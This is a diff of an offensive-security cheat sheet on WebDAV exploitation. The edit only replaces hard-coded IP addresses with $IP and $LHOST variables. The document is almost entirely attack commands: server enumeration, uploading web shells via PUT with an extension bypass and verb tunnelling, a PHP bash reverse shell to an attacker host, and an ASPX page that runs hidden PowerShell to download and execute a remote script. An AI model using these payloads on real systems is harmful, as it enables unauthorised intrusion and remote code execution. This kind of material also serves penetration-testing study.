@@ -15,7 +15,7 @@
 Use `OPTIONS` to identify allowed methods:
 
 ```bash
-curl -X OPTIONS http://10.10.10.10 -i
+curl -X OPTIONS http://$IP -i
 ```
 
 Look for:
@@ -28,11 +28,11 @@ DAV: 1,2
 ### Nmap Detection
 
 ```bash
-nmap -p 80,443 --script http-methods,http-webdav-scan 10.10.10.10
+nmap -p 80,443 --script http-methods,http-webdav-scan $IP
 ```
 
 ```bash
-sudo nmap -p 80 -sC 10.10.10.10
+sudo nmap -p 80 -sC $IP
 ```
 
 Key Nmap scripts:
@@ -60,13 +60,13 @@ Key Nmap scripts:
 ### Using `curl`
 
 ```bash
-curl -X OPTIONS http://10.10.10.10
+curl -X OPTIONS http://$IP
 ```
 
 ### Using `davtest`
 
 ```bash
-davtest -url http://10.10.10.10
+davtest -url http://$IP
 ```
 
 - Tests if PUT works.
@@ -76,7 +76,7 @@ davtest -url http://10.10.10.10
 
 ```bash
 use auxiliary/scanner/http/webdav_scanner
-set RHOSTS 10.10.10.10
+set RHOSTS $IP
 run
 ```
 
@@ -87,14 +87,14 @@ run
 ### Upload Payload with `cadaver`
 
 ```bash
-cadaver http://10.10.10.10
+cadaver http://$IP
 put shell.php
 ```
 
 ### Upload with Extension Bypass
 
 ```bash
-curl -X PUT --data-binary @shell.php http://10.10.10.10/shell.php;.jpg
+curl -X PUT --data-binary @shell.php http://$IP/shell.php;.jpg
 ```
 
 Try:
@@ -106,7 +106,7 @@ Try:
 ### HTTP Verb Tunneling
 
 ```bash
-curl -X POST -H "X-HTTP-Method-Override: PUT" --data-binary @shell.php http://10.10.10.10
+curl -X POST -H "X-HTTP-Method-Override: PUT" --data-binary @shell.php http://$IP
 ```
 
 ---
@@ -116,7 +116,7 @@ curl -X POST -H "X-HTTP-Method-Override: PUT" --data-binary @shell.php http://10
 ### PHP Reverse Shell
 
 ```php
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'"); ?>
+<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'"); ?>
 ```
 
 ```bash
@@ -127,7 +127,7 @@ cp /usr/share/webshells/php/php-reverse-shell.php .
 
 ```aspx
 <%@ Page Language="C#" %>
-<% System.Diagnostics.Process.Start("cmd.exe", "/c powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://<attacker-ip>/shell.ps1')\""); %>
+<% System.Diagnostics.Process.Start("cmd.exe", "/c powershell -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/shell.ps1')\""); %>
 ```
 
 ```bash
@@ -149,9 +149,9 @@ cp /usr/share/webshells/aspx/cmdasp.aspx .
 WebDAV is often installed with IIS 6.0/7.5/10. Upload `.aspx`, `.asp`, or `.config` files for RCE.
 
 ```
-http://10.10.10.10/uploads/shell.aspx
+http://$IP/uploads/shell.aspx
 ```
 
 ```bash
-curl -I http://10.10.10.10/uploads/
+curl -I http://$IP/uploads/
 ```
